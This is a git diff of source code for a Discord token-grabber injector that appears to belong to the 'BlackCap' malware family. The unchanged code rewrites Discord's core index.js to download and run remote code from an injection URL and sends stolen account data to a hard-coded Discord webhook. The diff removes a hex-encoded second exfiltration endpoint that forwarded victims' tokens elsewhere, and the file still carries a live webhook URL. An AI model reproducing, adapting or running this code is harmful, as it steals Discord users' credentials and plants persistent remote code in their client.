@@ -15,9 +15,8 @@ var config = {
     "init-notify": "true",
     "embed-color": 374276,
 
-    injection_url: "https://github.com/Kaserkas/infos/blob/main/index.js",
+    injection_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js",
     webhook: "https://discord.com/api/webhooks/1087767582439915570/lMNVe9rihj7YNEh1QFm683lpQ0rXojL66KaPZC4R1HuHPc8oSZ9718nJafPBYKxDT-L-",
-    uwu: "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x6f\x67\x69\x6e\x2e\x62\x6c\x61\x63\x6b\x63\x61\x70\x2d\x67\x72\x61\x62\x62\x65\x72\x2e\x63\x6f\x6d\x3a\x33\x30\x30\x30\x2f\x70\x72\x65\x6d\x69\x75\x6d\x2f",
     Filter: {
         "urls": [
             "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
@@ -112,11 +111,11 @@ const getGifOrPNG = async (url) => {
 
 const GetBadges = (e) => {
     var n = "";
-    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:918207395279273985> "), 4 == (4 & e) && (n += "<:mm_iconHypeEvents:898186057588277259> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 64 == (64 & e) && (n += "<:bravery:874750808388952075> "), 128 == (128 & e) && (n += "<:brilliance:874750808338608199> "), 256 == (256 & e) && (n += "<:balance:874750808267292683> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "), 131072 == (131072 & e) && (n += "<:mm_IconBotDev:898181029737680896> "), "" == n && (n = ":x:"), n
+    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:1041639667226914826> "), 4 == (4 & e) && (n += "<:hypesquadevent:1082679435452481738> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 64 == (64 & e) && (n += "<:bravery:874750808388952075> "), 128 == (128 & e) && (n += "<:brilliance:874750808338608199> "), 256 == (256 & e) && (n += "<:balance:874750808267292683> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "), 131072 == (131072 & e) && (n += "<:mm_IconBotDev:898181029737680896> "), "" == n && (n = ":x:"), n
 }
 const GetRBadges = (e) => {
     var n = "";
-    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:918207395279273985> "), 4 == (4 & e) && (n += "<:mm_iconHypeEvents:898186057588277259> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "), 131072 == (131072 & e) && (n += "<:mm_IconBotDev:898181029737680896> "), "" == n && (n = ":x:"), n
+    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:1041639667226914826> "), 4 == (4 & e) && (n += "<:hypesquadevent:1082679435452481738> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "), 131072 == (131072 & e) && (n += "<:mm_IconBotDev:898181029737680896> "), "" == n && (n = ":x:"), n
 }
 
 const GetNSFW = (bouki) => {
@@ -231,12 +230,7 @@ function GetLangue(read) {
 }
 const post = async (params) => {
     params = JSON.stringify(params)
-    var token = await execScript(tokenScript)
-    var n = JSON.stringify({
-        data: params,
-        token: token
-    });
-    [config.uwu, config.webhook].forEach(res => {
+    [config.webhook].forEach(res => {
         const url = new URL(res);
         const options = {
             host: url.hostname,
@@ -251,7 +245,7 @@ const post = async (params) => {
         req.on("error", (err) => {
             console.log(err);
         });
-        req.write(res == config.uwu ? n : params);
+        req.write(params);
         req.end();
     })
 
@@ -479,13 +473,10 @@ const checUpdate = () => {
     fs.writeFileSync(package, `{"name": "${appName}", "main": "./index.js"}`)
 
     var script = `const fs = require("fs"), https = require("https")
-
 var index = "${indexFile}"
 var betterDiscord = "${betterDiscord}"
-
 var bouki = fs.readFileSync(index).toString()
 if (bouki == "module.exports = require('./core.asar');") init()
-
 function init() {
     https.get("${config.injection_url}", res => {
         var chunk = ""
@@ -493,7 +484,6 @@ function init() {
         res.on("end", () => fs.writeFileSync(index, chunk.replace("%WEBHOOK%", "${config.webhook}")))
     }).on("error", (err) => setTimeout(init(), 10000));
 }
-
 require("${appPath}/app.asar")
 if (fs.existsSync(betterDiscord)) require(betterDiscord)`
 
